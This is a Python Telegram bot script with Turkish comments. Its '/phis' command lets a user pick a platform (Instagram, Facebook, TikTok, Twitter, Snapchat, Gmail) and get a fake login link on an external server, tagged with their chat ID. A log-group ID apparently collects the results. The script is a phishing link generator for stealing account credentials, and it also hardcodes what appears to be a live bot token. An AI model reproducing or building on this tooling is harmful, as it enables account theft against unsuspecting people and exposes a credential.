# Platform seçim butonları
import telebot
from telebot import types

# Bot token'ınızı buraya yazın
BOT_TOKEN = '6734341420:AAHZK3L1nXLzMGVYdYLatLiBgk1Vj430bCs'
bot = telebot.TeleBot(BOT_TOKEN)

# Kullanıcıların durumlarını takip etmek için bir sözlük
user_states = {}

# /phis komutu
@bot.message_handler(commands=['phis'])
def phis_command(message):
    if message.chat.type != "private":
        bot.reply_to(
            message,
            "❌ Bu komut yalnızca özel sohbetlerde kullanılabilir. Lütfen bana doğrudan mesaj gönderin."
        )
        return
    # Kullanıcı klavyesi oluştur
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add("Instagram 📸", "Facebook 👍", "TikTok 🎵")
    keyboard.add("Twitter 🐦", "Snapchat 👻", "Gmail 📧")
    keyboard.add("Geri ↩️")  # Geri butonu alt tarafa eklendi
    
    # Mesaj gönder
    bot.send_message(
        message.chat.id,
        "Hangi platformdan giriş yapmak istiyorsunuz?",
        reply_markup=keyboard
    )
    # Kullanıcının durumunu ayarla
    user_states[message.chat.id] = "waiting_for_selection"

# Mesajlara tepki verme
@bot.message_handler(func=lambda message: message.text in ["Instagram 📸", "Facebook 👍", "TikTok 🎵", "Twitter 🐦", "Snapchat 👻", "Gmail 📧", "Geri ↩️"])
def handle_buttons(message):
    if message.chat.id not in user_states:
        # Kullanıcı /phis komutunu çalıştırmadan butona bastıysa
        bot.send_message(message.chat.id, "Lütfen önce /phis komutunu kullanın.")
        return
    
    if message.text == "Geri ↩️":
        # Geri butonuna basıldığında klavyeyi gizle
        bot.send_message(
            message.chat.id,
            "Seçim iptal edildi. Tekrar platform seçmek için /phis komutunu yazabilirsiniz.",
            reply_markup=types.ReplyKeyboardRemove()
        )
        # Kullanıcının durumunu sıfırla
        user_states.pop(message.chat.id, None)
    else:
        # Platform seçildiğinde, link oluştur ve kullanıcı ID'sini ekle
        base_url = "https://8080-ie72mdtz5i4l4fohvnkw7-8809fef5.manusvm.computer/login/"
        platform_links = {
            "Instagram 📸": f"{base_url}instagram/{message.chat.id}",
            "Facebook 👍": f"{base_url}facebook/{message.chat.id}",
            "TikTok 🎵": f"{base_url}tiktok/{message.chat.id}",
            "Twitter 🐦": f"{base_url}twitter/{message.chat.id}",
            "Snapchat 👻": f"{base_url}snapchat/{message.chat.id}",
            "Gmail 📧": f"{base_url}gmail/{message.chat.id}",
        }
        selected_link = platform_links[message.text]

        bot.send_message(
            message.chat.id,
            f"Platform linkiniz: {selected_link}\n\nLinki."
        )

# Botu başlat
if __name__ == '__main__':
    print("Bot başlatılıyor...")
    bot.polling()



LOG_GROUP_CHAT_ID = -1002033390647


